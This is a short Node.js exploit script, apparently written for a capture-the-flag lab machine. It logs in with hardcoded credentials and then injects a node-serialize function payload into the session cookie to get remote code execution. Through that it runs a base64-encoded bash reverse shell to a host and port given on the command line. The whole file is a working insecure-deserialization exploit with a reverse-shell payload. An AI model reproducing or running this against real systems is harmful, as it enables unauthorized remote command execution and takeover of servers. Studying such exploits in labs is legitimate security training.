#!/usr/bin/env node

const axios = require('axios')

const user = 'admin'
const password = 'IppsecSaysPleaseSubscribe'
const baseUrl = 'http://10.10.11.139:5000'

const [lhost, lport] = process.argv.slice(2, 4)

const login = async () => {
  const res = await axios.post(`${baseUrl}/login`, { user, password })

  return res.headers['set-cookie'][0]
}

const rce = async (cookie, cmd) => {
  const paramIndex = cookie.indexOf(';')

  cookie =
    cookie.substring(0, paramIndex - 3) +
    encodeURIComponent(
      `,"rce":"_$$ND_FUNC$$_function() { require('child_process').exec('${cmd}') }()"}`
    ) +
    cookie.substring(paramIndex)

  await axios.get(baseUrl, { headers: { cookie } })
}

const reverseShell = () =>
  Buffer.from(`bash  -i >& /dev/tcp/${lhost}/${lport} 0>&1`).toString('base64')

const main = async () => {
  if (!lhost || !lport) {
    console.log('[!] Usage: node unserialize_rce.js <lhost> <lport>')
    process.exit()
  }

  const cookie = await login()
  console.log('[+] Login successful')

  await rce(cookie, `echo ${reverseShell()} | base64 -d | bash`)
  console.log('[+] RCE completed')
}

main()

